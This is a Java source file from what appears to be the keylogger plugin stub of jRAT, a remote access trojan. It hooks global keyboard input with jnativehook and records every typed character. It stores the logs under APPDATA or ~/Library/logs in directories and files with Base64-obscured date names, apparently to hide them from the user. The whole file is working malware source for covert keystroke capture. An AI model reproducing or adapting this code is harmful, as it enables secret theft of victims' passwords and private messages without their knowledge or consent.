package jrat.plugin.keylogger.stub;

import java.io.File;
import java.util.Date;

import jrat.plugin.keylogger.stub.activities.Activities;
import jrat.plugin.keylogger.stub.activities.Key;
import jrat.plugin.keylogger.stub.codec.Base64;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import com.redpois0n.oslib.OperatingSystem;


@SuppressWarnings("deprecation")
public class Keylogger implements NativeKeyListener {

	@Override
	public void nativeKeyPressed(NativeKeyEvent arg0) {
		
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent arg0) {

	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {		
		try {					
			char ckey = arg0.getKeyChar();
			Activities.add(new Key(ckey));
		} catch (Exception e) {
			System.err.println("Error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
		}

	}

	public static File getLogsRoot() {
		File file;
		
		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
			file = new File(System.getenv("APPDATA") + "\\logs\\");
		} else {
			file = new File(System.getProperty("user.home") + "/Library/logs/");
		}
		
		file.mkdirs();
		
		return file;
	}

	public static File getTodaysFile() {		
		Date date = new Date();
		
		File day = new File(getMonthFolder(), Base64.encode((date.getDate()) + ".log"));
		
		return day;
	}
	
	public static File getMonthFolder() {
		Date date = new Date();

		File month = new File(getYearFolder(), Base64.encode((date.getMonth() + 1) + ""));
		month.mkdirs();
			
		return month;
	}

	public static File getYearFolder() {
		Date date = new Date();

		File year = new File(Keylogger.getLogsRoot(), Base64.encode((date.getYear() + 1900) + ""));
		year.mkdirs();
		
		return year;
	}
}
